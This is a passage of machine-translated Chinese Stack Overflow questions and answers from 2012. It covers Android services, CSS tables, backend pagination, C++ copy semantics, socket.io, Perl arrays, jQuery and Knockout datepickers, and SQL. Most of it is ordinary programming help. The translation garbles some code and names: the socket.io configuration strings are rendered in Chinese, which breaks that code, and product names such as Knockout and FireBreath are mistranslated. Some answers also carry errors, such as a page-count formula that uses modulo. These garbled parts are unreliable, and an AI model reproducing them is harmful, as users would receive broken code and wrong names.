`Activity`展示我不相信直播的进展是正确的。尽管它们很可能是按顺序处理的，但框架或 Android 本身并不能保证交付时的顺序。这意味着您可以获得 50% 的广播，然后获得 40% 的广播。为此，我建议您查看以下示例：http: [//developer.android.com/reference/android/app/Service.html#LocalServiceSample](http://developer.android.com/reference/android/app/Service.html#LocalServiceSample)

它可能看起来有点复杂，但您将拥有可以依赖的 2 路通信。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-14T09:05:55.940

我设法找到了解决方案。事实证明，我必须使用广播意图来发布我的服务中的进度；并在我的活动中使用 BroadcastReceiver 来检索结果。

下面的链接显示了通过广播从服务中发送和检索结果的示例。

[http://mobile.tutsplus.com/tutorials/android/android-fundamentals-intentservice-basics/](http://mobile.tutsplus.com/tutorials/android/android-fundamentals-intentservice-basics/)

# html - IE以外的浏览器动态创建的表格显示无效

> ID：13343630
> 
> 赞同：0
> 
> 时间：2012-11-12T12:21:21.533
> 
> 标签：html, css, css-tables

我创建了一个包含一行和许多单元格的表格。每个单元格包含另一个表，其中包含许多行以包含图像、链接等数据。

最终结果是一种产品寻呼机形式，如下所示：http:
[//askmeexpress.com/](http://askmeexpress.com/)

我的问题是单元格在 IE 以外的浏览器中看起来像行（垂直而不是水平）。请检查 IE 中的链接，然后在 Chrome 中查看差异。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:27:41.110

## 您将 TD 设置为 display as`block`所以它们显示

根据 CSS 规范，Chrome 和 Firefox在单独的行中**正确显示。**IE 将其错误地显示为表格单元格（为什么我不感到惊讶？）。

因此，为了让您的单元格在 Chrome 和 Firefox 以及其他适当的浏览器中正确显示，请将单元格的显示样式更改为`table-cell`而不是`block`. 或者至少作为空字符串：

```
$("YourTdSelector").css("display", ""); 
```

**或者更好的是不要将表格用于您想要实现的目标**，而是使用语义正确的元素。在您的情况下，这将是`UL`元素，因为您正在显示一些东西的列表。

表格只能用于语义方面的表格数据，以使需要它的人（即盲人的屏幕阅读器）可以访问您的页面。

# javascript - 使用 angularJS 实现后端分页的最佳方法是什么？

> ID：13343645
> 
> 赞同：5
> 
> 时间：2012-11-12T12:22:57.427
> 
> 标签：javascript, angularjs, backend

我有一种情况，我想实现后端分页，但是我不知道该怎么做。我正在考虑一个解决方案，我获取总页数（一个页面是 n 个已定义元素的列表），然后调用服务器以获取第 1、2、3、4、.... 第 n 页等等在。有什么建议么 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:32:29.893

通常，分页是通过向用户指定每页显示多少个结果以及他当前正在查看的结果页来完成的。但是，诸如 MySQL 或 Solr 之类的后端存储通常通过指定每页显示多少结果以及在输出中跳过多少结果来处理分页。我通常使用类似下面的 PHP 来从前者（来自用户）中获取后者（用于后端）：

```
$documentsPerPage = 10;

if ( isset($input['page']) && is_numeric($input['page']) && $input['page']>0 ) { 
    $skip = $documentsPerPage * (intval($input['page'])-1);
} else {
    $skip =0;
}

$sql = "SELECT * FROM someTable LIMIT {$skip}, {$documentsPerPage}"; 
```

如果您`$count`在数据库中有记录，以下是如何通过模拟的楼层操作计算您有多少页：

```
$totalPages = ($count + $documentsPerPage - 1) % $documentsPerPage; 
```

# c++ - 如何实现两个类来自动决定深拷贝和浅拷贝？

> ID：13343646
> 
> 赞同：0
> 
> 时间：2012-11-12T12:22:59.887
> 
> 标签：c++, polymorphism, deep-copy, shallow-copy

我有以下设计问题：
我有`Resource`两种访问器：

*   一种是修改它（我们称之为`Access`）
*   一个是用于类似 const 的访问（我们称之为`Const_access`），但你可以说 c1=c2 然后 c1 将访问 c2。

鉴于这`Resource`很大，我必须实现以下复制机制：

```
Access->Access:             deep copy
Access->Const_access:       deep copy
Const_access->Access:       deep copy
Const_access->Const_access: shallow copy 
```

我的目标是编写`Access`以便`Const_access`能够准确`const`使用`Access`. 我目前的实现有缺陷，使用：

```
class Access {
  public:
  Access(const Access&); // deep copy
  void method(const Access&); 
  void const_method() const; 
  protected: 
  Resource res;
};
class Const_access : public Access{
  private:
  void method(); // only declaration
  public:
  Const_access(const Const_accesss&); // shallow copy
  explicit Const_access(const Access&); // deep copy
}; 
```

但这里`Const_access ca; ca.Access::method()`仍然有效，我必须手动隐藏非常量访问器。我已经尝试过受保护或私有继承，但这也限制`Access&`了处理的灵活性`Const_Access&`。

这个问题的正确解决方案是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:40:41.207

你说的很矛盾。

一方面，你想禁止这样的事情：

```
Const_access foo;
foo.modify(); 
```

但另一方面，您确实希望允许以下内容：

```
void bar(Access& a) {
    a.modify();
}

Const_access foo;
bar(foo); 
```

这根本不符合逻辑。

更合乎逻辑的关系是把继承结构转过来：

```
class Const_access {
public:
    Const_access(const Const_access&); // shallow copy
    void const_method() const;
protected:
    Resource res; // or perhaps a reference-counted pointer?
};

class Access: public Const_access {
public:
    Access(const Access&); // deep copy
    explicit Access(const Const_access&); // deep copy
    void method();
}; 
```

它唯一没有给出的是将 a 转换`Access` 为 a时的深拷贝`Const_access`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:39:07.290

您的函数`method()`在基类中具有公共可见性，但在派生类中是私有的。这违反了 Liskov 替换原则。派生类应该扩展而不是收缩基类。

解决方案是不违反该原则。例如，在`class Const_access`私有或受保护中进行继承，或者`method()`在`class Const_access`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-14T17:54:39.707

这个问题可以使用所谓的**惰性评估**简单地解决：
仅当成员函数想要修改类资源时才进行类资源的私有克隆。通过私有继承可以轻松解决对资源的 R/W 和只读访问。

这样 LSP 也被遵守：如果有必要，`Obj`现在可以完美地公开继承自。[有完整答案的链接。](https://stackoverflow.com/a/13384120/1705967)`Const_obj`

# node.js - 我怎样才能在 express 中访问 socket.io.min.js？

> ID：13343650
> 
> 赞同：5
> 
> 时间：2012-11-12T12:23:24.240
> 
> 标签：node.js, express, socket.io

我可以通过这个 url 连接 socket.io：localhost/socket.io/socket.io.js 但我需要缩小版！localhost/socket.io/socket.io.MIN.js 不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T15:06:24.400

Socket.IO 拦截请求以`/socket.io`提供它需要的文件。它通常为他们提供服务：

`./node_modules/socket.io/node_modules/socket.io-client/dist`

但是，正如[Socket.IO 的 wiki](https://github.com/LearnBoost/Socket.IO/wiki/How-do-I-serve-the-client)中所说，如果您愿意，您可以自己提供文件。

您需要的`/dist`文件位于[socket.io-client](https://github.com/LearnBoost/socket.io-client)存储库的文件夹中。

如果您想一直强制生产设置，您可以在调用之前将其添加到您的节点应用程序`listen()`：

```
io.enable('浏览器客户端缩小'); // 发送缩小客户端
io.enable('浏览器客户端标签'); // 根据版本号应用 etag 缓存逻辑
io.enable('浏览器客户端 gzip'); // 压缩文件
io.set('日志级别', 1); // 减少日志记录
io.set('transsports', [ // 启用所有传输（如果你想要 flashsocket，可选）
    '网络套接字'
  , '闪光灯插座'
  , 'html文件'
  , 'xhr 轮询'
  , 'jsonp 轮询'
]);

```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-06T15:01:06.820

最新的**socket.io.js 缩小**版本，截至今天（**0.9.16 版**）：

[http://cdnjs.cloudflare.com/ajax/libs/socket.io/0.9.16/socket.io.min.js](http://cdnjs.cloudflare.com/ajax/libs/socket.io/0.9.16/socket.io.min.js)

# c++ - 在 C++ 中创建交互式提示

> ID：13343657
> 
> 赞同：5
> 
> 时间：2012-11-12T12:24:00.830
> 
> 标签：c++, oop, design-patterns, parameters

我有一个程序应该从控制台读取命令，并根据命令执行几个操作之一。这是我到目前为止所拥有的：

```
void ConwayView::listening_commands() {
    string command;

    do {
        cin >> command;

        if ("tick" == command)
        {
            // to do
        }
        else if ("start" == command)
        {
            // to do for start
        }
        ...

    } while (EXIT != command);
} 
```

如果有大量命令，使用 a`switch`代替语句会有所帮助。`if`您建议使用哪些模式来提供交互式命令行？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T12:32:22.670

有多种方法可以解决这个问题，“正确”的解决方案是什么值得商榷。如果我要为自己的工作解决它，我会创建一个自定义结构的表。就像是：

```
struct CommandStruct {
    char *command;
    int (*commandHandler)(/*params*/);
} commandTable[] = {
    { "tick",  tickCommand },
    { "start", startCommand },
    ...
}; 
```

然后我的处理循环将遍历该表的每个元素，寻找正确的匹配项，例如：

```
for (int i = 0; i < TABLE_SIZE; ++i) {
    if (command == commandTable[i].command) { /* using whatever proper comparison is, of course */
        commandTable[i].commandHandler(/*params*/);
        break;
    }
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-12T12:32:29.490

不是真正的模式，但通常是一个好方法：

```
#include <map>
#include <functional>
#include <string>
#include <iostream>

typedef std::map< std::string, std::function<void(void)> > command_dict;
//                                           ^^^^^^^^
//                               the signature of your commands. probably should have an error code.

void command1() { std::cout << "commanda" << std::endl; }
void command2() { std::cout << "commandb" << std::endl; }
void command3() { std::cout << "commandc" << std::endl; }

int main() {
  command_dict c;
  c["a"] = &command1;
  c["b"] = &command2;
  c["c"] = &command3;

  std::string input;
  while(std::getline(std::cin, input)) { // quit the program with ctrl-d
    auto it = c.find(input);
    if(it != end(c)) {
      (it->second)(); // execute the command
    } else {
      std::cout << "command \"" << input << "\" not known" << std::endl;
    }
  }
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-12T12:33:14.980

如果命令数量很少并且可能的参数很少，您可以继续使用 switch case ！

如果命令的数量增加，请考虑[命令设计模式](http://en.wikipedia.org/wiki/Command_pattern)（恕我直言，这是某种伪装的[策略模式](http://en.wikipedia.org/wiki/Strategy_pattern)：cf [Using a strategy pattern and a command pattern](https://stackoverflow.com/q/3883692/356440) for the difference between command and strategy patterns）。

如果您的大多数命令都共享相同行为的一部分，请不要忘记[模板方法模式](http://en.wikipedia.org/wiki/Template_method_pattern)。

如果创建命令对象的复杂性增加（即解码/理解命令行输入的复杂性），您应该开始查看[解释器设计模式](http://en.wikipedia.org/wiki/Interpreter_pattern)

如果在使用解释器模式进行设计时，您碰巧看到了一些复杂性（如果解释器需要太多工作，您会看到语法问题等等），那么您可能应该看看[DSL，领域特定语言](http://en.wikipedia.org/wiki/Domain-specific_language)，并设计您的适合（并且仅适合）您自己的输入的自己的语言。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-12T12:31:50.947

-梯子很好`if`。`else`

原则上它可以用 a 代替`map<string, Function>`，但是对于这个具体的情况，这不会给你带来任何好处（它增加了复杂性，没有特别的好处，即使有大量的命令）。

当我最初写这篇文章时，我忘了提及：

*   使您的命令处理程序分离功能。

如果你不这样做，那么`if`-`else`梯子可能会变得非常混乱......该`map`解决方案需要单独的功能，因此看起来比一切都直接在这里`if`-`else`梯子更干净一些。但实际上是单独的函数提供了一定程度的清晰度，而这`map`会降低一点（在维护地图方面增加了额外的工作，以及额外的间接级别来应对）。

另一方面，由于“从控制台读取命令”表示*交互式*输入，因此图片中有用户，您不希望从同一行输入中读取两个或多个命令。因为这会搞砸提示，并且对用户来说似乎很莫名其妙。`>>`因此，不要使用一次读取输入的“单词”，而是`std::getline`一次读取整行输入。

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2014-03-17T03:56:15.533

使用新的和改进的方式随意执行一堆命令：

```
int happy_time = 5;
int a = happy_time;
int muddy_dirt = 1;
int b = muddy_dirt;
int c = happy_time * muddy_dirt //really messy stuff 
```

这可能是最简单的方法......

* * *

## 回答 #6

> 赞同：-6
> 
> 时间：2012-11-12T13:29:37.077

如果您的命令很大，则必须使用类似数据库的访问。

# javascript - 将输入值存储为 var 并显示

> ID：13343662
> 
> 赞同：0
> 
> 时间：2012-11-12T12:24:19.893
> 
> 标签：javascript, jquery, google-maps

这是我正在使用的代码：http: [//jsfiddle.net/DYfbg/12/](http://jsfiddle.net/DYfbg/12/)

如果您单击“地图”，然后尝试输入地名，它会为您提供自动完成建议。然后，如果您单击这些建议之一，它会在警报框中告诉您坐标。

我想要做的是在单击自动完成选项时捕获输入框中的内容，然后将其存储为变量。然后在警报框中，连同坐标，我想将输入框变量打印到其中。

我知道这一切听起来很简单，但我是 javascript 新手，所以我非常感谢一些输入。

这是代码段：

```
google.maps.event.addListener(autocomplete, 'place_changed', function() {
    var place = autocomplete.getPlace();
    **// Store input box as variable**
    if (!place.geometry) {
        current_place = null;
        alert('Cannot find place');
        return;
    } else {
        current_place = place;
        alert('Place is at:' + place.geometry.location);
        **// Print input box varaible aswell**
    } }); 
```

编辑：这是尽可能接近而不会卡住：

```
 // Set Autocomplete Location Variable equal to #loc input
    $("#loc").val(ac_location);
    // Print Autocomplete Variable
    alert(ac_location); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:38:11.460

在返回的“地方”对象中

```
var place = autocomplete.getPlace(); 
```

你有你需要的所有信息添加一个console.log，你会看到所有返回的信息。例如：

```
var place = autocomplete.getPlace();
console.log(place);
window.myGlobalVar = place.name; 
```

根据以下注释进行编辑：似乎输入框的原始值实际上存储在此属性中：

```
autocomplete.gm_accessors_.place.lf.d 
```

# arrays - 为什么我似乎无法从 Perl 的数组中删除未定义的元素？

> ID：13343663
> 
> 赞同：3
> 
> 时间：2012-11-12T12:24:25.680
> 
> 标签：arrays, perl, list

我有一个来自哈希表中数据的字符串数组。我正在尝试删除任何（显然）空元素，但由于某种原因，似乎有一个顽固的元素拒绝离开。

我在做：

```
# Get list array from hash first, then
@list = grep { $_ ne ' ' } @list; 
@list = uniq @list;
return sort @list; 
```

在这`grep`条线上，我收到了`Use of uninitialized value in string ne...`下面正确打印数组其余部分的消息。

我已经尝试过“漫长”的方式：

```
foreach (@list) {
    if ($_ ne ' ') {
        push @new_list, $_;
    }
} 
```

但这会产生完全相同的结果。我尝试使用`defined`预期结果（无）。

我可以事先对数组进行排序并删除第一个元素，但这似乎非常冒险，因为我不能保证数据集总是有空白元素。诉诸正则表达式似乎也过分了，但也许我错了。像往常一样，我确定我错过了一些简单得可笑的东西。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T12:27:42.890

元素不能为空。您正在尝试删除*未定义*的元素。但是您不是在检查元素是否未定义，而是在检查它是否包含由单个空格组成的字符串。你要：

```
@list = grep defined, @list; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-12T12:44:18.980

我的回答假设您不希望字符串为空（表示未定义或长度为 0）或仅由空格组成。

您的`grep`行仅测试恰好等于一个空格的字符串。但是，该警告暗示至少有一个数组元素确实是`undefined`. 将未定义的值与 比较`eq`只会为空字符串产生 true，而不是单个空格。

因此，为了删除所有未定义或仅包含空格的条目，您可以执行以下操作：

`@list = grep { defined && m/[^\s]/ } @list;`

请注意，对于 Perl，空格是正确的。因此，简单`grep defined, @list`实际上不会丢弃仅由空格组成的条目。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-12T15:04:52.110

看起来您想要过滤所有包含非空格字符的元素。要做到这一点以及拒绝未定义的元素，您可以简单地编写

```
@list = uniq grep { defined and /\S/ } @list; 
```

# jquery - Jquery ui Datepicker maxDate 动态

> ID：13343667
> 
> 赞同：8
> 
> 时间：2012-11-12T12:24:46.357
> 
> 标签：jquery, jquery-ui

早上好，我想动态控制我的日期选择器的 maxDate。例如。：我的表格上有一个日期，文本框的值为 20/12/12。

我试过了，但没有用，日历从我在文本框上的日期开始禁用 maxDate。你能帮我解决这个问题吗：

```
$(function() { 
    var date = new Date(); 
    var m = date.getMonth(), d = date.getDate(), y = date.getFullYear(); 
    $("#Panel2nrFecha").datepicker({ 
        minDate: new Date(y, m, d), 
        maxDate: $("#Panel2nrTextBox1").val(), 
        dateFormat: "dd/mm/y", 
        defaultDate: "+1w", 
        changeMonth: true, 
        numberOfMonths: 3 
    }); 
}); 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-12T12:45:17.777

初始化日期选择器后，您可以`maxDate`像这样更改选项：

```
$("#Panel2nrFecha").datepicker('option', 'maxDate', $("#Panel2nrTextBox1").val() ); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-12T12:44:34.427

使用`beforeShow`datepicker 的属性设置最小和最大日期，如本教程 [jQuery UI Datepicker v3.4.3 Examples - Date range](http://test.thecodecentral.com/cms/jqueryui/datepicker/#range) by Marc Grabanski 和 Keith Wood 所述：

```
$("#Panel2nrFecha").datetimepicker({
    beforeShow: customRange,
    dateFormat: "dd/mm/y", 
    defaultDate: "+1w", 
    changeMonth: true, 
    numberOfMonths: 3 
});

function customRange(input) {
    return { minDate: (input.id == 'Panel2nrMinDateTextBox' ? $('#Panel2nrMinDateTextBox').datepicker('getDate') : null),
        maxDate: (input.id == 'Panel2nrMaxDateTextBox' ? $('#Panel2nrMaxDateTextBox').datepicker('getDate') : null)
    };
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-12T12:44:09.700

如果不发布一些 HTML，我不确定这是否能解决您的问题，但您是否尝试过：

```
$(function() { 
    var date = new Date();  
    $("#Panel2nrFecha").datepicker({ 
        minDate: date, 
        maxDate: new Date($("#Panel2nrTextBox1").val()), 
        dateFormat: "dd/mm/y", 
        defaultDate: "+1w", 
        changeMonth: true, 
        numberOfMonths: 3 
    }); 
}); 
```

请注意，我已经删除了`y`,`m`和`d`变量，并且还添加了 datepicker`new Date()`的`maxDate`属性。

# google-chrome-extension - 跨浏览器工具栏开发框架

> ID：13343674
> 
> 赞同：1
> 
> 时间：2012-11-12T12:25:41.527
> 
> 标签：google-chrome-extension, cross-browser, firefox-addon, toolbar, browser-extension

我正在寻找一个可以为所有浏览器（IE、Firefox、Chrome）创建浏览器扩展（即工具栏）的框架。

我已经搜索了一个相关的解决方案，但我发现没有一个是我需要的：

1.  CrossRider - 不好，因为它不能自托管。这同样适用于像 Conduit 这样的公司，以及我遇到的几乎所有其他解决方案。
2.  Kango - 这看起来确实像我需要的一样，但是恕我直言，许可证太贵了。

有谁知道允许跨浏览器工具栏开发（使用 js 和 html）的框架？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:28:25.507

我自己从未尝试过，但我记得我的一位同事不久前谈到了[火焰吐息。](http://www.firebreath.org/)

# r - 将国际格式的字符串转换为数字

> ID：13343677
> 
> 赞同：3
> 
> 时间：2012-11-12T12:26:18.467
> 
> 标签：r

我有一个包含测量单位的国际格式数字（即字符串）的文件。在这种情况下，小数位用“，”表示，1e3 分隔符用“.”表示。（即德国数字格式）。

```
a <- c('2.200.222   €',
       '  180.109,3 €') 
```

或者

```
b <- c('28,42 m²',
       '47,70 m²') 
```

我想有效地将​​这些字符串转换为`numeric`. 我试图通过代码过滤掉数字

```
require(stringr)
str_extract(a, pattern='[0-9]+.[0-9]+.[0-9]+')
str_extract(b, pattern='[0-9]+,[0-9]+') 
```

但是，这似乎太容易出错了，我想必须有一个更标准化的方式。所以这是我的问题：是否有自定义函数、包或其他能够解决此类问题的东西？

非常感谢你！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-12T12:55:26.147

这是一个`gsub`用于处理您发布的示例数据的函数：

```
x <- c('2.200.222   €', '  180.109,3 €', '28,42 m²', '47,70 m²')

strip <- function(x){
  z <- gsub("[^0-9,.]", "", x)
  z <- gsub("\\.", "", z)
  gsub(",", ".", z)
}

as.numeric(strip(x))
[1] 2200222.00  180109.30      28.42      47.70 
```

* * *

它是这样工作的：

1.  首先去掉所有尾随的非数字（以及这些非数字之后的任何内容）
2.  然后去掉所有句号。
3.  最后，将逗号转换为句点。

# knockout.js - 所有 Jquery UI DatePicker 和 KnockoutJS Change 事件一次触发所有

> ID：13343680
> 
> 赞同：0
> 
> 时间：2012-11-12T12:26:23.203
> 
> 标签：knockout.js, jquery-ui-datepicker

我正在使用此处找到的解决方案：

[KnockoutJS 未捕获 jQuery UI 日期选择器更改事件](https://stackoverflow.com/questions/6612705/knockout-with-jquery-ui-datepicker)

我在页面上有许多日期选择器控件。当其中一个发生更改时，所有这些更改事件都会触发。

RefreshData 是一个自定义函数，用于在日期范围更改时刷新 ViewModel 中的数据。

我错过了什么 - 这是一个非常令人沮丧的下午，试图让它正常工作

这是我的淘汰赛绑定：

```
ko.bindingHandlers.datepicker = {
init: function (element, valueAccessor, allBindingsAccessor) {
    var options = allBindingsAccessor().datepickerOptions || {};
    $(element).datepicker(options);

    ko.utils.registerEventHandler(element, "change", function () {
        var observable = valueAccessor();
        observable($(element).datepicker("getDate"));
    });

    ko.utils.domNodeDisposal.addDisposeCallback(element, function () {
        $(element).datepicker("destroy");
    });

},
update: function (element, valueAccessor) {
    var value = ko.utils.unwrapObservable(valueAccessor());
    var current = $(element).datepicker("getDate");

    if (value - current !== 0) {
        $(element).datepicker("setDate", value);
    }

    RefreshData(element.id); //Should only fire once, but is firing for every datepicker on the page
}
}; 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-11-12T13:03:10.633

好的 - 找到了答案。当我退后一步并在 StackOverflow 上重新查看它时，真的很明显（我正在配对 - 所以我们都错过了它）。

更新函数是对日期选择器的更新，而不是特定元素。我需要的是以下内容：

```
ko.bindingHandlers.datepicker = {
init: function (element, valueAccessor, allBindingsAccessor) {
    var options = allBindingsAccessor().datepickerOptions || {};
    $(element).datepicker(options);

    ko.utils.registerEventHandler(element, "change", function () {
        var observable = valueAccessor();
        observable($(element).datepicker("getDate"));

        RefreshData(element.id); //This now fires only on the change event of the correct datepicker
    });

    ko.utils.domNodeDisposal.addDisposeCallback(element, function () {
        $(element).datepicker("destroy");
    });

},
update: function (element, valueAccessor) {
    var value = ko.utils.unwrapObservable(valueAccessor());
    var current = $(element).datepicker("getDate");

    if (value - current !== 0) {
        $(element).datepicker("setDate", value);
    }

}
}; 
```

# wcf - 同步框架：SQL Server 到 SQL Server 到 SQL Express

> ID：13343683
> 
> 赞同：0
> 
> 时间：2012-11-12T12:27:00.640
> 
> 标签：wcf, microsoft-sync-framework

我对 Sync Framework 很陌生，仍在探索不同的可能性。这是我的场景。

我们需要有一个托管在我们的 Web 服务器上的应用程序（SQL Server 和 ASP.Net）。用户可以在线注册并与之互动。该应用程序的另一个副本将安装在我们客户的 Intranet 服务器上。用户可以通过 LAN 在此服务器上注册。

该应用程序的第三个副本 (SQL Express) 将安装在各种笔记本电脑和 Windows 7 平板电脑上。用户将在没有连接到 LAN 或互联网的情况下远程使用该应用程序。一旦设备回到网络中，它将与 LAN 服务器同步数据，LAN 服务器将同步到 Internet 服务器。

为了安全起见，我打算使用 WCF 服务和同步框架来执行此操作，但是我愿意接受建议。有人可以建议我这样做的正确方法，并指出一些教程示例来做到这一点。我一直在努力使用在线可用的示例（主要是这个[http://code.msdn.microsoft.com/Database-SyncSQL-Server-e97d1208](http://code.msdn.microsoft.com/Database-SyncSQL-Server-e97d1208)），但仍然没有成功..

随时提出任何问题，我会尽我所能回答。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T01:41:45.937

查看此链接并使用 SQL Server 忽略/替换 Azure 特定的内容...它对 WCF 特定组件进行了很好的讨论... [Windows Azure 同步服务示例演练](http://social.technet.microsoft.com/wiki/contents/articles/1568.walkthrough-of-windows-azure-sync-service-sample.aspx)

# wix - MSI 补丁：我们可以提供带有补丁的新组件/文件吗？

> ID：13343685
> 
> 赞同：0
> 
> 时间：2012-11-12T12:27:25.263
> 
> 标签：wix, patch

**简单的问题：**我们可以使用补丁交付新的文件/组件吗？

我实际上尝试了 Purely Wix 方法，即[http://wix.sourceforge.net/manual-wix3/wix_patching.htm](http://wix.sourceforge.net/manual-wix3/wix_patching.htm)，但对我不起作用。

补丁创建属性（pcp）方法没有给我任何选择这样做，这就是为什么它现在不在我的上下文中了。

我们的安装程序已经能够进行重大升级，但如果有 2 或 3 个新闻文件，我们打算避免向用户提供 500+ MB 的构建，而是考虑提供小补丁。

上面提到的过程似乎可以很好地为已安装的文件提供更新文件。

此致

# ipad - 如何交叉淡入 UIScrollView 回到开头

> ID：13343688
> 
> 赞同：1
> 
> 时间：2012-11-12T12:27:31.283
> 
> 标签：ipad, uiview, core-animation, transitions

我在 iPad 应用程序中有一个水平滚动的分页 UIScrollView，包含很多页面。在最后一页，我点击屏幕上的一个按钮以重置回第 1 页。我希望能够交叉溶解这个过渡，但它似乎不起作用：

```
[UIView transitionWithView:self.view duration:1.0 options:UIViewAnimationOptionTransitionCrossDissolve|UIViewAnimationOptionAllowAnimatedContent animations:^{
    pagingScrollView.contentOffset = CGPointZero;
} completion:^(BOOL finished) {
    [self refreshPages];
}]; 
```

我读到添加`UIViewAnimationOptionAllowAnimatedContent`将允许所有内容转换，但它不起作用。相反，屏幕会交叉溶解为背景色，当过渡完成时，第一页就会出现。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-12T14:04:10.387

您不能淡出 UIView （滚动条）并同时淡入同一个视图...

你可以只使用不同的 UIViews ......

你可以做的是：

1）fadeOut当前位置的滚动条（到背景）

2）当滚动条不可见时，将其移动到正确的位置（没有动画）

3）从后台淡入滚动条

就像是：

```
// START FIRST PART OF ANIMATION
[UIView animateWithDuration:0.5 delay:0.0 options: options:UIViewAnimationOptionTransitionCrossDissolve|UIViewAnimationOptionAllowAnimatedContent animations:^{
    pagingScrollView.alpha = 0;

} completion:^(BOOL finished) {

// FIRST PART ENDED
// MOVE SCROLLER (no animation)
    pagingScrollView.contentOffset = CGPointZero;

// START SECOND PART OF ANIMATION
[UIView animateWithDuration:0.5 delay:0.0 options: options:UIViewAnimationOptionTransitionCrossDissolve|UIViewAnimationOptionAllowAnimatedContent animations:^{
// fadeIn - animated
    pagingScrollView.alpha = 1;
} completion:^(BOOL finished) {

// ANIMATION ENDED
    [self refreshPages];
}];

}]; 
```

**新编辑：**

感谢 amadour，他的评论教会了我一些东西，

我希望他能添加他自己的答案，我会投票给他

无论如何，要回答乔伊原始问题：

我得到了正确的动画，只是将 contentOffset 设置移出动画块，并删除 UIViewAnimationOptionAllowAnimatedContent （不是真的需要），并将 pagingScrollView 作为参数传递给 transitionWithView

这对我有用：

```
 pagingScrollView.contentOffset = CGPointZero;
    [UIView transitionWithView:pagingScrollView duration:3.0 options:UIViewAnimationOptionTransitionCrossDissolve animations:^{
//        pagingScrollView.contentOffset = CGPointZero; // move up, outside of animation block
    } completion:^(BOOL finished) {
        NSLog(@"-->> END amimation");
        [self refreshPages];
    }]; 
```

# opengl - OpenGL Cube 奇怪的错误

> ID：13343694
> 
> 赞同：2
> 
> 时间：2012-11-12T12:27:45.247
> 
> 标签：opengl, lwjgl, cube, vertex

我在 LWJGL、OpenGL 中渲染一个简单的 VBO 立方体。6 个具有正确法线、顶点和 RGB 颜色的四边形。但是，我遇到了一个奇怪的错误。

![奇怪的立方体 VBO 错误](../Images/15bcc02a0939e4a6eafc2eb3bc1cb58f.png)

关于可能导致此错误的任何想法？

谢谢！

编辑：立方体绘图代码：

```
glPushMatrix();
              GL15.glBindBuffer(GL15.GL_ARRAY_BUFFER, vertex_buffer_id);
              GL11.glVertexPointer(3, GL11.GL_FLOAT, 40, 0);
              GL11.glNormalPointer(GL11.GL_FLOAT, 40, 12);
              GL11.glColorPointer(4, GL11.GL_FLOAT, 40, 24);
              GL11.glDrawArrays(GL11.GL_QUADS, 0, vertex_data_array.length / 10);
              glPopMatrix(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T13:33:17.063

发现了问题。我的 zNear 设置为 0.00001。出于某种原因，当我将其更改为 0.01 时它运行良好。谢谢大家:)

# sql - 类似不同 DBMS 中的 SQL

> ID：13343695
> 
> 赞同：1
> 
> 时间：2012-11-12T12:27:49.240
> 
> 标签：sql, sqlite, postgresql

我正在执行一个简单的类似查询，例如

```
SELECT * FROM table WHERE column LIKE '%searchterm%'; 
```

在导入到 SQLite DB 和 Postgres DB 的相同数据上。

但是，两个数据库之间的结果数量不同。我尝试使用谷歌搜索，但我无法真正找出是否存在任何重大的实现差异。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:38:17.327

您会发现的主要区别之一是 Postgres`LIKE`查询区分大小写，而 Sqlite 不区分大小写（至少对于 ASCII 字符）。您需要使用`ILIKE`在 Postgres 中获得不区分大小写的匹配。

# mysql - 内部 SQL 查询优化

> ID：13343698
> 
> 赞同：1
> 
> 时间：2012-11-12T12:27:58.613
> 
> 标签：mysql, sql, query-optimization

我对 SQL 查询有疑问，有什么方法可以加快这个查询的速度吗？表字包含 14 000 行，查询在 localhost 上花费了 4.5631 秒。

```
 SELECT 
    (SELECT SUM((SELECT COUNT(*)
                    FROM word w
                    WHERE w.lecture_id = l._id AND active = 1))
        FROM lecture l
        WHERE l.book_id = b._id) AS active_word_count,
    (SELECT SUM((SELECT COUNT(*)
                 FROM word w
                 WHERE w.lecture_id = l._id))
        FROM lecture l
        WHERE book_id = b._id) AS word_count,
    (SELECT COUNT(*)
     FROM lecture l
     WHERE l.book_id = b._id) AS lecture_count,
    b._id,
    b.name,
    b.version
FROM book b

CREATE TABLE book (
  _id int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  version tinyint(3) unsigned NOT NULL,
  lang tinyint(4) NOT NULL DEFAULT '1',
  PRIMARY KEY (_id)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=21 ;

CREATE TABLE lecture (
  _id int(11) NOT NULL AUTO_INCREMENT,
  book_id int(11) NOT NULL,
  lecture_name varchar(255) NOT NULL,
  PRIMARY KEY (_id)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=155 ;

CREATE TABLE word (
  _id int(11) NOT NULL AUTO_INCREMENT,
  question varchar(255) NOT NULL,
  answer varchar(255) NOT NULL,
